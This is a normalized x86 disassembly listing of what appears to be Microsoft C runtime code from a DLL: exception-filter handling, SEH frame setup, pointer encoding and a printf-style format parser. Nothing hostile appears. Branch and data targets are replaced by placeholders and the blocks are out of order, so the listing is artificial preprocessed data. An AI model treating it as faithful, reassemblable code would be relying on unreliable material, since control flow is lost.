push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1001fc57
add esp 0x14
pop ebp
retn
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1001f7de
jmp r-xdata
cmp eax 0x41
je r-xdata
add esp 0x18
pop ebp
retn
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1001fd18
jmp r-xdata
sub_1001fe8d
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1001fe05
add esp 0x1c
pop ebp
retn
sub_1001feb0
mov edi edi
push esi
push edi
xor edi edi
push [ edi + rw-data ]
call [ EncodePointer@IAT ]
mov [ edi + rw-data ] eax
add edi 0x4
cmp edi 0x28
jb r-xdata
pop edi
pop esi
retn
sub_1001fed3
mov edi edi
push esi
push 0x30000
push 0x10000
xor esi esi
push esi
call sub_10028928
add esp 0xc
test eax eax
je r-xdata
pop esi
retn
push esi
push esi
push esi
push esi
push esi
call sub_1001ea23
sub_1001fefb
mov edi edi
push ebp
mov ebp esp
push esi
call sub_1001e29d
mov esi eax
test esi esi
je r-xdata
pop esi
pop ebp
retn
mov ecx [ esi + 0x5c ]
mov edx [ ebp + 0x8 ]
mov eax ecx
push edi
add ecx 0x90
cmp eax ecx
jae r-xdata
add eax 0xc
lea edi [ ecx + 0x90 ]
cmp eax edi
jb r-xdata
xor eax eax
cmp [ eax ] edx
je r-xdata
cmp [ eax ] edx
je r-xdata
xor eax eax
jmp r-xdata
mov edx [ eax + 0x8 ]
test edx edx
jne r-xdata
test eax eax
je r-xdata
pop edi
cmp edx 0x5
jne r-xdata
cmp edx 0x1
je r-xdata
and [ eax + 0x8 ] 0x0
xor eax eax
inc eax
jmp r-xdata
or eax 0xffffffff
mov ecx [ ebp + 0xc ]
push ebx
mov ebx [ esi + 0x60 ]
mov [ esi + 0x60 ] ecx
mov ecx [ eax + 0x4 ]
cmp ecx 0x8
jne r-xdata
and [ eax + 0x8 ] 0x0
push ecx
call edx
push 0x24
pop ecx
mov edi [ esi + 0x5c ]
and [ ecx + edi + 0x8 ] 0x0
add ecx 0xc
cmp ecx 0x90
jl r-xdata
mov eax [ eax ]
mov edi [ esi + 0x64 ]
cmp eax 0xc000008e
jne r-xdata
cmp eax 0xc0000090
jne r-xdata
mov [ esi + 0x64 ] 0x83
jmp r-xdata
cmp eax 0xc0000091
jne r-xdata
mov [ esi + 0x64 ] 0x81
jmp r-xdata
push [ esi + 0x64 ]
push 0x8
call edx
pop ecx
mov [ esi + 0x64 ] edi
jmp r-xdata
cmp eax 0xc0000093
jne r-xdata
mov [ esi + 0x64 ] 0x84
jmp r-xdata
pop ecx
mov [ esi + 0x60 ] ebx
pop ebx
cmp eax 0xc000008d
jne r-xdata
mov [ esi + 0x64 ] 0x85
jmp r-xdata
cmp eax 0xc000008f
jne r-xdata
mov [ esi + 0x64 ] 0x82
jmp r-xdata
cmp eax 0xc0000092
jne r-xdata
mov [ esi + 0x64 ] 0x86
jmp r-xdata
cmp eax 0xc00002b5
jne r-xdata
mov [ esi + 0x64 ] 0x8a
jmp r-xdata
cmp eax 0xc00002b4
jne r-xdata
mov [ esi + 0x64 ] 0x8d
jmp r-xdata
mov [ esi + 0x64 ] 0x8e
sub_10020045
mov edi edi
push ebp
mov ebp esp
mov eax 0xe06d7363
cmp [ ebp + 0x8 ] eax
jne r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0xc ]
push eax
call sub_1001fefb
pop ecx
pop ecx
pop ebp
retn
sub_10020070
push sub_100200d0
push [ fs : 0x0 ]
mov eax [ esp + 0x10 ]
mov [ esp + 0x10 ] ebp
lea ebp [ esp + 0x10 ]
sub esp eax
push ebx
push esi
push edi
mov eax [ rw-data ]
xor [ ebp - 0x4 ] eax
xor eax ebp
push eax
mov [ ebp - 0x18 ] esp
push [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] 0xfffffffe
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
mov [ fs : 0x0 ] eax
retn
sub_100200d0
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebx + 0x8 ]
xor esi [ rw-data ]
push edi
mov eax [ esi ]
mov [ ebp - 0x1 ] 0x0
mov [ ebp - 0xc ] 0x1
lea edi [ ebx + 0x10 ]
cmp eax 0xfffffffe
je r-xdata
mov ecx [ esi + 0xc ]
mov eax [ esi + 0x8 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_1001a809
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x66
jne r-xdata
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_1001a809
mov edx 0xfffffffe
cmp [ ebx + 0xc ] edx
je r-xdata
mov ecx [ ebp + 0x10 ]
lea edx [ ebp - 0x18 ]
mov [ ebx - 0x4 ] edx
mov ebx [ ebx + 0xc ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] ecx
cmp ebx 0xfffffffe
je r-xdata
mov eax [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push rw-data
push edi
mov ecx ebx
call sub_1002622b
jmp r-xdata
lea ecx [ ecx ]
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
mov ebx eax
cmp eax 0xfffffffe
jne r-xdata
mov edx edi
call sub_100261e2
mov [ ebp - 0x1 ] 0x1
test eax eax
js r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_1001a809
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_1001a809
lea eax [ ebx + ebx * 2 ]
mov ecx [ esi + eax * 4 + 0x14 ]
lea eax [ esi + eax * 4 + 0x10 ]
mov [ ebp - 0x10 ] eax
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
test ecx ecx
je r-xdata
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov [ ebp - 0xc ] 0x0
jmp r-xdata
jg r-xdata
mov ecx [ ebp + 0x8 ]
cmp [ ecx ] 0xe06d7363
jne r-xdata
mov eax [ ebp - 0x8 ]
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
call sub_10026212
mov eax [ ebp + 0xc ]
cmp [ eax + 0xc ] ebx
je r-xdata
cmp [ r--data ] 0x0
je r-xdata
mov ecx [ ebp - 0x8 ]
mov [ eax + 0xc ] ecx
mov eax [ esi ]
cmp eax 0xfffffffe
je r-xdata
push rw-data
push edi
mov edx ebx
mov ecx eax
call sub_1002622b
mov eax [ ebp + 0xc ]
push r--data
call sub_100268a0
add esp 0x4
test eax eax
je r-xdata
mov ecx [ esi + 0xc ]
mov edx [ esi + 0x8 ]
add ecx edi
xor ecx [ edx + edi ]
call sub_1001a809
mov eax [ ebp - 0x10 ]
mov ecx [ eax + 0x8 ]
mov edx edi
call sub_100261f9
mov ecx [ esi + 0x4 ]
add ecx edi
xor ecx [ eax + edi ]
call sub_1001a809
mov edx [ ebp + 0x8 ]
push 0x1
push edx
call [ r--data ]
add esp 0x8
sub_1002025f
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
push [ ebp + 0x8 ]
push 0x0
push [ rw-data ]
call [ HeapSize@IAT ]
pop ebp
retn
call sub_1001bddd
mov [ eax ] 0x16
call sub_1001ea75
or eax 0xffffffff
pop ebp
retn
sub_10020292
mov edi edi
push ebp
mov ebp esp
sub esp 0x474
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
mov esi [ ebp + 0xc ]
xor ebx ebx
push edi
mov edi [ ebp + 0x14 ]
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x458 ]
mov [ ebp - 0x424 ] eax
mov [ ebp - 0x41c ] edi
mov [ ebp - 0x444 ] ebx
mov [ ebp - 0x408 ] ebx
mov [ ebp - 0x430 ] ebx
mov [ ebp - 0x40c ] ebx
mov [ ebp - 0x428 ] ebx
mov [ ebp - 0x448 ] ebx
mov [ ebp - 0x42c ] ebx
call sub_1001b46f
cmp [ ebp - 0x424 ] ebx
jne r-xdata
cmp esi ebx
je r-xdata
call sub_1001bddd
mov [ eax ] 0x16
call sub_1001ea75
cmp [ ebp - 0x44c ] bl
movzx edx [ esi ]
xor ecx ecx
mov [ ebp - 0x418 ] ebx
mov [ ebp - 0x414 ] ebx
mov [ ebp - 0x43c ] ebx
mov [ ebp - 0x420 ] edx
cmp dx bx
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x450 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x44c ] 0x0
je r-xdata
push 0x2
pop ebx
add esi ebx
cmp [ ebp - 0x418 ] 0x0
mov [ ebp - 0x440 ] esi
jl r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1001a809
leave
retn
mov eax [ ebp - 0x418 ]
mov eax [ ebp - 0x450 ]
and [ eax + 0x70 ] 0xfffffffd
lea eax [ edx - 0x20 ]
cmp ax 0x58
ja r-xdata
xor eax eax
movzx eax dx
movsx eax [ eax + r--data ]
and eax 0xf
jmp r-xdata
mov esi [ ebp - 0x440 ]
movzx eax [ esi ]
mov [ ebp - 0x420 ] eax
test ax ax
je r-xdata
jmp [ eax * 4 + jump_table_10020e36 ]
movsx eax [ ecx + eax * 8 + r--data ]
push 0x7
sar eax 0x4
pop ecx
mov [ ebp - 0x45c ] eax
cmp eax ecx
ja r-xdata
mov ecx [ ebp - 0x45c ]
mov edi [ ebp - 0x41c ]
mov edx eax
jmp r-xdata
xor eax eax
or [ ebp - 0x40c ] 0xffffffff
mov [ ebp - 0x460 ] eax
mov [ ebp - 0x448 ] eax
mov [ ebp - 0x430 ] eax
mov [ ebp - 0x428 ] eax
mov [ ebp - 0x408 ] eax
mov [ ebp - 0x42c ] eax
jmp r-xdata
movzx eax dx
sub eax 0x20
je r-xdata
cmp dx 0x2a
jne r-xdata
and [ ebp - 0x40c ] 0x0
jmp r-xdata
cmp dx 0x2a
jne r-xdata
movzx eax dx
cmp eax 0x49
je r-xdata
mov eax [ ebp - 0x424 ]
push edx
lea esi [ ebp - 0x418 ]
mov [ ebp - 0x42c ] 0x1
call sub_10020e56
jmp r-xdata
movzx eax dx
cmp eax 0x64
jg r-xdata
or [ ebp - 0x408 ] ebx
jmp r-xdata
sub eax 0x3
je r-xdata
mov eax [ ebp - 0x430 ]
imul eax eax 0xa
movzx ecx dx
lea eax [ eax + ecx - 0x30 ]
mov [ ebp - 0x430 ] eax
jmp r-xdata
add edi 0x4
mov [ ebp - 0x41c ] edi
mov edi [ edi - 0x4 ]
mov [ ebp - 0x430 ] edi
test edi edi
jns r-xdata
mov eax [ ebp - 0x40c ]
imul eax eax 0xa
movzx ecx dx
lea eax [ eax + ecx - 0x30 ]
mov [ ebp - 0x40c ] eax
jmp r-xdata
add edi 0x4
mov [ ebp - 0x41c ] edi
mov edi [ edi - 0x4 ]
mov [ ebp - 0x40c ] edi
test edi edi
jns r-xdata
movzx eax [ esi ]
cmp eax 0x36
jne r-xdata
cmp eax 0x68
je r-xdata
pop ecx
cmp eax 0x70
jg r-xdata
je r-xdata
or [ ebp - 0x408 ] 0x80
jmp r-xdata
sub eax 0x8
je r-xdata
or [ ebp - 0x408 ] 0x4
neg [ ebp - 0x430 ]
jmp r-xdata
or [ ebp - 0x40c ] 0xffffffff
jmp r-xdata
cmp eax 0x33
jne r-xdata
cmp [ esi + 0x2 ] 0x34
jne r-xdata
or [ ebp - 0x408 ] 0x20
jmp r-xdata
cmp eax 0x6c
je r-xdata
sub eax 0x73
je r-xdata
je r-xdata
or [ ebp - 0x408 ] 0x40
cmp eax 0x53
jg r-xdata
or [ ebp - 0x408 ] 0x1
jmp r-xdata
sub eax ebx
je r-xdata
cmp eax 0x64
je r-xdata
cmp [ esi + 0x2 ] 0x32
jne r-xdata
add esi 0x4
or [ ebp - 0x408 ] 0x8000
mov [ ebp - 0x440 ] esi
jmp r-xdata
cmp [ esi ] 0x6c
jne r-xdata
cmp eax 0x77
jne r-xdata
mov ebx [ ebp - 0x40c ]
cmp ebx 0xffffffff
jne r-xdata
sub eax ebx
je r-xdata
mov [ ebp - 0x40c ] 0x8
cmp eax 0x65
jl r-xdata
test ecx 0x1000
jne r-xdata
mov eax [ edi ]
mov edx [ edi + 0x4 ]
add edi 0x8
jmp r-xdata
sub eax 0x58
je r-xdata
je r-xdata
or [ ebp - 0x408 ] 0x4
jmp r-xdata
sub eax 0x3
jne r-xdata
cmp eax 0x69
je r-xdata
add esi 0x4
and [ ebp - 0x408 ] 0xffff7fff
mov [ ebp - 0x440 ] esi
jmp r-xdata
or [ ebp - 0x408 ] 0x10
jmp r-xdata
add esi ebx
or [ ebp - 0x408 ] 0x1000
mov [ ebp - 0x440 ] esi
jmp r-xdata
or [ ebp - 0x408 ] 0x800
jmp r-xdata
add edi 0x4
test [ ebp - 0x408 ] 0x20
mov [ ebp - 0x41c ] edi
mov edi [ edi - 0x4 ]
mov [ ebp - 0x410 ] edi
je r-xdata
mov ebx 0x7fffffff
mov [ ebp - 0x420 ] 0xa
sub eax 0x3
jne r-xdata
test [ ebp - 0x408 ] 0x80
mov [ ebp - 0x420 ] 0x10
je r-xdata
cmp [ ebp - 0x448 ] 0x0
jne r-xdata
cmp eax 0x67
jle r-xdata
add edi 0x4
test cl 0x20
je r-xdata
mov [ ebp - 0x41c ] edi
mov [ ebp - 0x444 ] ecx
jmp r-xdata
sub eax ebx
je r-xdata
test [ ebp - 0x408 ] 0x830
jne r-xdata
sub eax 0x41
je r-xdata
or [ ebp - 0x408 ] 0x8
jmp r-xdata
cmp eax 0x6f
je r-xdata
test edi edi
jne r-xdata
test edi edi
jne r-xdata
mov [ ebp - 0x444 ] 0x27
mov ecx [ ebp - 0x408 ]
test ecx 0x8000
je r-xdata
push 0x30
pop eax
mov [ ebp - 0x434 ] ax
mov eax [ ebp - 0x444 ]
add eax 0x51
mov [ ebp - 0x432 ] ax
mov [ ebp - 0x428 ] ebx
jmp r-xdata
cmp [ ebp - 0x43c ] 0x0
je r-xdata
mov eax [ ebp - 0x408 ]
test al 0x40
je r-xdata
or [ ebp - 0x408 ] 0x40
cmp [ ebp - 0x40c ] 0x0
lea edi [ ebp - 0x404 ]
mov eax 0x200
mov [ ebp - 0x410 ] edi
mov [ ebp - 0x414 ] eax
jge r-xdata
cmp eax 0x69
je r-xdata
mov eax [ edi - 0x4 ]
test cl 0x40
je r-xdata
mov [ ebp - 0x41c ] edi
test cl 0x40
je r-xdata
test [ ebp - 0x408 ] 0x9000
mov ebx edx
mov edi eax
jne r-xdata
test edx edx
jg r-xdata
mov eax [ edi ]
add edi 0x4
mov [ ebp - 0x41c ] edi
test eax eax
je r-xdata
sub eax ecx
je r-xdata
or [ ebp - 0x408 ] 0x20
add edx 0x20
mov [ ebp - 0x460 ] 0x1
mov [ ebp - 0x420 ] edx
sub eax ebx
je r-xdata
cmp eax 0x75
je r-xdata
mov eax [ ebp - 0x410 ]
mov [ ebp - 0x42c ] 0x1
jmp r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x410 ] eax
and [ ebp - 0x414 ] 0x0
mov esi [ ebp - 0x410 ]
test ebx ebx
jle r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x410 ] eax
push [ ebp - 0x43c ]
call sub_1001a3eb
and [ ebp - 0x43c ] 0x0
mov ebx [ ebp - 0x430 ]
sub ebx [ ebp - 0x414 ]
sub ebx [ ebp - 0x428 ]
test [ ebp - 0x408 ] 0xc
mov [ ebp - 0x470 ] ebx
jne r-xdata
test eax 0x100
je r-xdata
jne r-xdata
mov [ ebp - 0x40c ] 0x6
jmp r-xdata
cmp eax 0x6e
je r-xdata
xor edx edx
cdq
jmp r-xdata
movzx eax [ edi - 0x4 ]
movsx eax [ edi - 0x4 ]
jmp r-xdata
cmp [ ebp - 0x40c ] 0x0
jge r-xdata
xor ebx ebx
jl r-xdata
mov eax [ rw-data ]
mov [ ebp - 0x410 ] eax
push eax
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
sub eax ebx
jne r-xdata
test [ ebp - 0x408 ] 0x830
jne r-xdata
sub eax ebx
je r-xdata
cmp eax 0x78
je r-xdata
test ebx ebx
jne r-xdata
mov al [ esi ]
test al al
je r-xdata
mov edi [ ebp - 0x424 ]
mov ecx [ ebp - 0x428 ]
lea eax [ ebp - 0x434 ]
push eax
lea eax [ ebp - 0x418 ]
call sub_10020e85
test [ ebp - 0x408 ] 0x8
pop ecx
je r-xdata
mov edi ebx
test ebx ebx
jle r-xdata
test al 0x1
je r-xdata
push 0x2d
jmp r-xdata
cmp [ ebp - 0x40c ] eax
jle r-xdata
cmp dx 0x67
jne r-xdata
mov eax [ ebp - 0x41c ]
mov ecx [ eax ]
add eax 0x8
mov esi [ DecodePointer@IAT ]
mov [ ebp - 0x41c ] eax
mov eax [ eax - 0x4 ]
mov [ ebp - 0x468 ] eax
lea eax [ ebp - 0x458 ]
push eax
push [ ebp - 0x460 ]
movsx eax dl
push [ ebp - 0x40c ]
mov [ ebp - 0x46c ] ecx
push eax
push [ ebp - 0x414 ]
lea eax [ ebp - 0x46c ]
push edi
push eax
push [ rw-data ]
call esi
call eax
mov ebx [ ebp - 0x408 ]
add esp 0x1c
and ebx 0x80
je r-xdata
mov esi [ edi ]
add edi 0x4
mov [ ebp - 0x41c ] edi
call sub_10027516
test eax eax
je r-xdata
cmp eax 0x6f
jne r-xdata
test cl 0x40
je r-xdata
cdq
jmp r-xdata
and [ ebp - 0x408 ] 0xfffffff7
mov eax 0x200
cmp [ ebp - 0x40c ] eax
jle r-xdata
mov [ ebp - 0x40c ] 0x1
jmp r-xdata
neg eax
adc edx 0x0
neg edx
or [ ebp - 0x408 ] 0x100
test eax eax
jae r-xdata
mov [ ebp - 0x414 ] eax
test [ ebp - 0x408 ] 0x800
movsx eax [ eax ]
mov [ ebp - 0x410 ] ecx
je r-xdata
movzx eax [ edi ]
add edi 0x4
xor esi esi
inc esi
test [ ebp - 0x408 ] 0x20
mov [ ebp - 0x42c ] esi
mov [ ebp - 0x41c ] edi
mov [ ebp - 0x464 ] eax
je r-xdata
or [ ebp - 0x408 ] 0x20
jmp r-xdata
sub eax ebx
jne r-xdata
cmp eax 0x58
je r-xdata
dec ebx
cmp [ eax ] 0x0
je r-xdata
sub eax [ ebp - 0x410 ]
lea ecx [ ebp - 0x458 ]
movzx eax al
push ecx
push eax
call sub_1002769e
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x42c ] 0x0
jne r-xdata
test [ ebp - 0x408 ] 0x4
jne r-xdata
mov eax [ ebp - 0x424 ]
push 0x20
lea esi [ ebp - 0x418 ]
dec edi
call sub_10020e56
cmp [ ebp - 0x418 ] 0xffffffff
pop ecx
je r-xdata
test al 0x2
je r-xdata
push 0x2b
jmp r-xdata
pop eax
mov [ ebp - 0x434 ] ax
mov [ ebp - 0x428 ] 0x1
mov ebx 0xa3
cmp [ ebp - 0x40c ] ebx
jle r-xdata
mov [ ebp - 0x40c ] eax
mov [ ebp - 0x40c ] 0x1
jmp r-xdata
cmp [ ebp - 0x420 ] 0x67
jne r-xdata
cmp [ ebp - 0x40c ] 0x0
jne r-xdata
call sub_1001bddd
mov [ eax ] 0x16
call sub_1001ea75
cmp [ ebp - 0x44c ] 0x0
jmp r-xdata
test [ ebp - 0x408 ] 0x20
je r-xdata
test [ ebp - 0x408 ] 0x80
mov [ ebp - 0x420 ] 0x8
je r-xdata
mov eax edi
or eax ebx
jne r-xdata
mov [ ebp - 0x40c ] eax
and [ ebp - 0x42c ] 0x0
jmp r-xdata
cdq
sub eax edx
mov [ ebp - 0x42c ] 0x1
jmp r-xdata
mov [ ebp - 0x404 ] ax
mov [ ebp - 0x438 ] al
lea eax [ ebp - 0x458 ]
push eax
mov eax [ ebp - 0x458 ]
mov [ ebp - 0x437 ] 0x0
push [ eax + 0xac ]
lea eax [ ebp - 0x438 ]
push eax
lea eax [ ebp - 0x404 ]
push eax
call sub_10028b0e
add esp 0x10
test eax eax
jns r-xdata
and [ ebp - 0x45c ] 0x0
add eax 0x2
inc esi
inc [ ebp - 0x414 ]
cmp [ ebp - 0x414 ] ebx
jl r-xdata
inc esi
push [ ebp - 0x410 ]
mov edi [ ebp - 0x424 ]
mov ecx [ ebp - 0x414 ]
lea eax [ ebp - 0x418 ]
call sub_10020e85
pop ecx
cmp [ ebp - 0x414 ] 0x0
jle r-xdata
mov edi ebx
test ebx ebx
jle r-xdata
test edi edi
jg r-xdata
push 0x20
mov edx [ ebp - 0x420 ]
mov esi [ ebp - 0x40c ]
add esi 0x15d
push esi
call sub_1001bcbc
mov edx [ ebp - 0x420 ]
pop ecx
mov [ ebp - 0x43c ] eax
test eax eax
je r-xdata
cmp [ edi ] 0x2d
jne r-xdata
test ebx ebx
jne r-xdata
lea eax [ ebp - 0x458 ]
push eax
push edi
push [ rw-data ]
call esi
call eax
pop ecx
pop ecx
je r-xdata
mov eax [ ebp - 0x418 ]
mov [ esi ] eax
mov ax [ ebp - 0x418 ]
mov [ esi ] ax
jmp r-xdata
or [ ebp - 0x408 ] 0x200
jmp r-xdata
lea esi [ ebp - 0x205 ]
and [ ebp - 0x428 ] eax
sar eax 0x1
lea eax [ ebp - 0x404 ]
mov [ ebp - 0x410 ] eax
mov [ ebp - 0x414 ] esi
jmp r-xdata
mov [ ebp - 0x448 ] esi
jmp r-xdata
jmp r-xdata
test [ ebp - 0x408 ] 0x4
je r-xdata
mov edi [ ebp - 0x410 ]
mov ebx [ ebp - 0x414 ]
mov eax [ ebp - 0x424 ]
push 0x30
lea esi [ ebp - 0x418 ]
dec edi
call sub_10020e56
cmp [ ebp - 0x418 ] 0xffffffff
pop ecx
je r-xdata
mov [ ebp - 0x40c ] ebx
jmp r-xdata
mov [ ebp - 0x410 ] eax
mov [ ebp - 0x414 ] esi
mov edi eax
jmp r-xdata
push edi
jmp r-xdata
or [ ebp - 0x408 ] 0x100
inc edi
mov [ ebp - 0x410 ] edi
lea eax [ ebp - 0x458 ]
push eax
push edi
push [ rw-data ]
call esi
call eax
pop ecx
pop ecx
mov [ ebp - 0x448 ] 0x1
jmp r-xdata
mov eax [ ebp - 0x420 ]
cdq
push edx
push eax
push ebx
push edi
call sub_10025e50
add ecx 0x30
mov [ ebp - 0x470 ] ebx
mov edi eax
mov ebx edx
cmp ecx 0x39
jle r-xdata
mov eax edi
or eax ebx
je r-xdata
mov edi [ ebp - 0x470 ]
jmp r-xdata
or [ ebp - 0x418 ] 0xffffffff
jmp r-xdata
push [ ebp - 0x464 ]
mov eax [ ebp - 0x424 ]
lea esi [ ebp - 0x418 ]
call sub_10020e56
add edi [ ebp - 0x420 ]
pop ecx
test ebx ebx
jg r-xdata
test edi edi
jg r-xdata
call sub_1001cbb0
pop ecx
jmp r-xdata
mov [ esi ] cl
dec esi
jmp r-xdata
add ecx [ ebp - 0x444 ]
lea eax [ ebp - 0x205 ]
sub eax esi
inc esi
test [ ebp - 0x408 ] 0x200
mov [ ebp - 0x414 ] eax
mov [ ebp - 0x410 ] esi
je r-xdata
test edi edi
jg r-xdata
cmp [ ebp - 0x418 ] 0x0
jl r-xdata
lea eax [ ebp - 0x458 ]
push eax
mov eax [ ebp - 0x458 ]
push [ eax + 0xac ]
lea eax [ ebp - 0x464 ]
push edi
push eax
dec ebx
call sub_10028b0e
add esp 0x10
mov [ ebp - 0x420 ] eax
test eax eax
jle r-xdata
jmp r-xdata
mov eax [ ebp - 0x40c ]
dec [ ebp - 0x40c ]
test eax eax
jg r-xdata
test eax eax
je r-xdata
mov eax [ ebp - 0x424 ]
push 0x20
lea esi [ ebp - 0x418 ]
dec edi
call sub_10020e56
cmp [ ebp - 0x418 ] 0xffffffff
pop ecx
je r-xdata
dec [ ebp - 0x410 ]
mov ecx [ ebp - 0x410 ]
mov [ ecx ] 0x30
inc eax
jmp r-xdata
mov ecx esi
cmp [ ecx ] 0x30
je r-xdata
sub_10020e56
mov edi edi
push ebp
mov ebp esp
test [ eax + 0xc ] 0x40
je r-xdata
push eax
push [ ebp + 0x8 ]
call sub_10028987
pop ecx
pop ecx
mov ecx 0xffff
cmp ax cx
jne r-xdata
cmp [ eax + 0x8 ] 0x0
je r-xdata
inc [ esi ]
pop ebp
retn
or [ esi ] 0xffffffff
pop ebp
retn
sub_10020e85
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi eax
mov ebx ecx
call sub_1001bddd
test [ edi + 0xc ] 0x40
mov eax [ eax ]
mov [ ebp - 0x4 ] eax
je r-xdata
call sub_1001bddd
and [ eax ] 0x0
jmp r-xdata
cmp [ edi + 0x8 ] 0x0
jne r-xdata
test ebx ebx
jg r-xdata
add [ esi ] ebx
jmp r-xdata
mov eax [ ebp + 0x8 ]
movzx eax [ eax ]
push eax
mov eax edi
dec ebx
call sub_10020e56
add [ ebp + 0x8 ] 0x2
cmp [ esi ] 0xffffffff
pop ecx
jne r-xdata
call sub_1001bddd
cmp [ eax ] 0x0
jne r-xdata
pop esi
pop ebx
leave
retn
call sub_1001bddd
cmp [ eax ] 0x2a
jne r-xdata
call sub_1001bddd
mov ecx [ ebp - 0x4 ]
mov [ eax ] ecx
push 0x3f
mov eax edi
call sub_10020e56
pop ecx
sub_10020efe
mov edi edi
push ebp
mov ebp esp
sub esp 0x474
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
xor eax eax
push edi
mov edi [ ebp + 0x14 ]
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x44c ]
mov [ ebp - 0x42c ] esi
mov [ ebp - 0x418 ] edi
mov [ ebp - 0x454 ] eax
mov [ ebp - 0x408 ] eax
mov [ ebp - 0x430 ] eax
mov [ ebp - 0x40c ] eax
mov [ ebp - 0x424 ] eax
mov [ ebp - 0x450 ] eax
mov [ ebp - 0x428 ] eax
call sub_1001b46f
test esi esi
jne r-xdata
xor eax eax
cmp ebx eax
je r-xdata
call sub_1001bddd
mov [ eax ] 0x16
call sub_1001ea75
cmp [ ebp - 0x440 ] 0x0
je r-xdata
movzx ecx [ ebx ]
mov [ ebp - 0x41c ] eax
mov [ ebp - 0x414 ] eax
mov [ ebp - 0x43c ] eax
mov [ ebp - 0x458 ] eax
mov [ ebp - 0x420 ] ecx
cmp cx ax
je r-xdata
or eax 0xffffffff
jmp r-xdata
mov eax [ ebp - 0x444 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x440 ] 0x0
je r-xdata
push 0x2
pop esi
add ebx esi
xor eax eax
mov [ ebp - 0x45c ] ebx
cmp [ ebp - 0x41c ] eax
jl r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_1001a809
leave
retn
mov eax [ ebp - 0x41c ]
mov eax [ ebp - 0x444 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0x43c ] 0x0
je r-xdata
lea edx [ ecx - 0x20 ]
cmp dx 0x58
ja r-xdata
cmp [ ebp - 0x43c ] 0x7
jne r-xdata
mov edx [ ebp - 0x43c ]
imul eax eax 0x9
movzx eax [ eax + edx + r--data ]
push 0x8
shr eax 0x4
pop edx
mov [ ebp - 0x43c ] eax
cmp eax edx
je r-xdata
movzx eax cx
movzx eax [ eax + r--data ]
and eax 0xf
cmp eax 0x7
ja r-xdata
mov ebx [ ebp - 0x45c ]
mov edi [ ebp - 0x418 ]
jmp [ eax * 4 + jump_table_10021a92 ]
mov ecx eax
jmp r-xdata
xor eax eax
or [ ebp - 0x40c ] 0xffffffff
mov [ ebp - 0x460 ] eax
mov [ ebp - 0x450 ] eax
mov [ ebp - 0x430 ] eax
mov [ ebp - 0x424 ] eax
mov [ ebp - 0x408 ] eax
mov [ ebp - 0x428 ] eax
jmp r-xdata
movzx eax cx
sub eax 0x20
je r-xdata
cmp cx 0x2a
jne r-xdata
and [ ebp - 0x40c ] 0x0
jmp r-xdata
cmp cx 0x2a
jne r-xdata
movzx eax cx
cmp eax 0x49
je r-xdata
mov eax [ ebp - 0x42c ]
push ecx
lea esi [ ebp - 0x41c ]
mov [ ebp - 0x428 ] 0x1
call sub_10020e56
pop ecx
jmp r-xdata
movzx eax cx
cmp eax 0x64
jg r-xdata
movzx eax [ ebx ]
mov [ ebp - 0x420 ] eax
test ax ax
je r-xdata
or [ ebp - 0x408 ] esi
jmp r-xdata
sub eax 0x3
je r-xdata
mov eax [ ebp - 0x430 ]
imul eax eax 0xa
movzx ecx cx
lea eax [ eax + ecx - 0x30 ]
mov [ ebp - 0x430 ] eax
jmp r-xdata
mov eax [ edi ]
add edi 0x4
mov [ ebp - 0x418 ] edi
mov [ ebp - 0x430 ] eax
test eax eax
jns r-xdata
mov eax [ ebp - 0x40c ]
imul eax eax 0xa
movzx ecx cx
lea eax [ eax + ecx - 0x30 ]
mov [ ebp - 0x40c ] eax
jmp r-xdata
mov eax [ edi ]
add edi 0x4
mov [ ebp - 0x418 ] edi
mov [ ebp - 0x40c ] eax
test eax eax
